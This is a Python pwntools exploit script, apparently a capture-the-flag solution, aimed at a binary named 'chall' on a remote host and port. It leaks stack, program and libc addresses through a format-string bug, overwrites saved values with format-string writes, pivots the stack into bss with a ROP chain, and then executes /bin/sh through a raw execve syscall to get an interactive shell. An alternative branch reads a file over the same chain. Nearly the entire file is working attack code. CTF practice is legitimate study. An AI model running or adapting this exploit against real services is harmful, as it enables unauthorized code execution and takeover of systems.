#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 60903 ./print_only
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
# host = args.HOST or '103.152.242.172'
# port = int(args.PORT or 60903)

host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40904)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    # , aslr=False
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"},gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *0x5555555551ed
b *0x55555555522b
c
c
c
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL :
    libc = exe.libc
    libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
else:
    # libc = ELF("./libc.so.6")
    libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
    # libc = ELF("./libc6_2.31-6_amd64.so")
    # libc = ELF("./libc6_2.31-9_amd64.so")

def send(p):
    p = p.ljust(0x128,"\x00")
    io.send(p)




def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx) + p64(0xdeadbeef)
    chain += p64(syscall_ret)
    return chain


# %8$p-%9$p-%11$p-%12$p-%13$p-%14$p-%15$p
# 9 = 13
# 0x7fff4cb2b780-0x56086879726d-0xa03e68ea03423c00-0x56086879a068-0x560868797240-0x2000000000-0x7fff4cb2b868
p='%p-%8$p-%13$p-%15$p'
send(p)
# leak = (io.recv(4200)).split('-')
leak = io.recv(4200)
print (leak)
leak = (str(leak)).split('-')
base_exe = int(leak[0],16)- 0x4060
stack = int(leak[1],16) - 0x30

# print hex(int(leak[2],16))

if args.LOCAL :
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 + 3
else:
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 + 3

print (hex(stack))
print (hex(base_exe))
print (hex(libc.address))

pop_rax = libc.search(asm('pop rax ; ret')).next()
pop_rbp = libc.search(asm('pop rbp ; ret')).next()
pop_rdi = libc.search(asm('pop rdi ; ret')).next()
pop_rsi = libc.search(asm('pop rsi ; ret')).next()
pop_rsp = libc.search(asm('pop rsp ; ret')).next()
if args.LOCAL :
    # pop_rdx = libc.search(asm('pop rdx ; pop r12 ; ret')).next()
    pop_rdx = libc.search(asm('pop rdx ; pop r10 ; ret')).next()
else:
    pop_rdx = libc.search(asm('pop rdx ; pop r10 ; ret')).next()
syscall_ret = libc.search(asm('syscall ; ret')).next()

leave= base_exe + 0x1240

bss = base_exe + 0x4000
stack_rbp = stack + 16

print ("leave :", hex(leave))
print ("base_exe + 0x4060 + 8 :", hex(base_exe + 0x4060 + 8))

def format_string(dari, to, len_format = 0xff):
    sys = dari
    offset = []

    for i in range(1):
       tmp = sys & len_format
       offset.append(tmp)
       sys >>= len_format.bit_length() # bit

    p = '%{}x%{}${}n-EOF'.format(offset[0], to, 'h'*(1))
    p = p.ljust(32, '\x00')
    send(p)
    io.recvuntil("-EOF")

def make_offset(addr, len=1):
    len_format = 2**(len*8)-1
    offset = []

    for i in range(8/len):
       tmp = addr & len_format
       offset.append(tmp)
       addr >>= len_format.bit_length() # bit

    return offset


# print p64(leave)

# 14
# stack+(7*8)
# 43
# %8$p-%9$p-%11$p-%12$p-%13$p-%14$p-%15$p
value = stack+(7*8)
offset = make_offset(leave, 2)

for i in range(3):
    format_string(value+(i*2), 15, len_format = 0xffff)
    format_string(offset[i], 41, len_format = 0xffff)

value = base_exe + 0x4060 + 8 + 16
format_string(value, 8, len_format = 0xffff)
value = stack+(3*8)

format_string(value, 15, len_format = 0xffff)

offset = make_offset(leave, 2)

p = '%{}x%41$hn-EOF'.format(offset[0])
p = p.ljust(32, '\x00')
# p += "/bin/sh\x00"
# p += syscall(1,1,base_exe + 0x4060 + 32,8)
# p += syscall(59,base_exe + 0x4060 + 32,0,0)

p += syscall(0, 0, bss+0x100, 400)
p += p64(pop_rsp)
p += p64(bss+0x100+8*5)

# p += p64(pop_rbp)
# p += p64(bss+0x100+8*4)
# p += p64(leave)
print (len(p))
send(p)
io.recvuntil("-EOF")



pop_shell = 1

if pop_shell:
    p = '\x00/bin/sh\x00'
    p = p.ljust(40,"\x00")
    p += syscall(59, bss+0x101, 0, 0)
else :
    if args.LOCAL:
        fd=3
    else:
        fd=5
    size = 0x290
    size = 0x500
    p = '/start.sh'
    # p = '/app/flag_csitffzr9nmk1jth.txt'
    p = '/bin/sh'
    p = p.ljust(40,"\x00")
    p += syscall(2, bss+0x100, 0, 0)
    # p += syscall(78, fd, bss+0x300, size)
    p += syscall(0, fd, bss+0x300, size)
    p += syscall(1, 1, bss+0x300, size)

print (len(p))
assert len(p) < 400
p = p.ljust(399,"\x00")
io.sendline(p)

# if pop_shell == 0:
#     data = io.recv(size-0)
#     print data
#     print(dirents(data))

io.interactive()
